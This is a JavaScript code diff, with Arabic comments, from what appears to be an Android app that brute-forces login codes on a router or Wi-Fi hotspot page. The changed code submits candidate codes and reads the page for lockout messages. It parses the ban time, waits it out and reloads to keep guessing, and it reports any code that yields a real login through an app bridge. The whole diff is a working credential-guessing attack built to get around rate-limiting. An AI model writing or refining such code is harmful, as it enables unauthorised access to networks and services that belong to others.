@@ -34,20 +34,40 @@
 
             if (btn) { try { btn.click(); } catch(e) {} }
 
-            await new Promise(r => setTimeout(r, 1000));
+            // انتظار استجابة الراوتر
+            await new Promise(r => setTimeout(r, 1500));
 
-            const errDiv = document.getElementById('error');
-            if (errDiv) {
-                const err = errDiv.innerText.trim();
-                if (err !== "") {
-                    log('📄 ' + err);
-                    if (err.includes("صحيح") || err.includes("تم") || err.includes("success")) {
-                        log('✅✅✅ ' + v);
-                        try { window["AndroidBridge" + id].found(v, err); } catch(e) {}
-                        window.__cracking = false;
-                        return;
-                    }
+            const pageText = document.body.innerText;
+
+            // 1. فحص الحظر (استخراج الوقت وانتظاره)
+            if (pageText.includes("انت محظور") || pageText.includes("تجاوزت العدد المسموح")) {
+                const match = pageText.match(/(\d+)\s*(?:دقائق|دقيقة|دقائق و)\s*(?:و)?\s*(\d+)?\s*(?:ثانية|ثواني)?/);
+                let waitSec = 60; // افتراضي دقيقة
+                if (match) {
+                    const mins = parseInt(match[1]) || 0;
+                    const secs = parseInt(match[2]) || 0;
+                    waitSec = (mins * 60) + secs;
                 }
+                log('🛑 حظر! انتظار ' + waitSec + ' ثانية ثم إعادة المحاولة...');
+                await new Promise(r => setTimeout(r, waitSec * 1000));
+                
+                if (stopped) break;
+                location.href = "index.html"; // إعادة تحميل الصفحة
+                return;
+            }
+
+            // 2. فحص النجاح الحقيقي
+            if (window.location.href.includes("status") || pageText.includes("تم تسجيل الدخول") || pageText.includes("الوقت المتبقي")) {
+                log('✅✅✅ نجاح حقيقي: ' + v);
+                try { window["AndroidBridge" + id].found(v, pageText); } catch(e) {}
+                window.__cracking = false;
+                return;
+            }
+
+            // 3. عرض رسالة الخطأ الحقيقية (غير موجود / منتهي)
+            const errDiv = document.getElementById('error');
+            if (errDiv && errDiv.innerText.trim() !== "") {
+                log('📄 ' + errDiv.innerText.trim());
             }
 
             await new Promise(r => setTimeout(r, CFG.pause || 200));
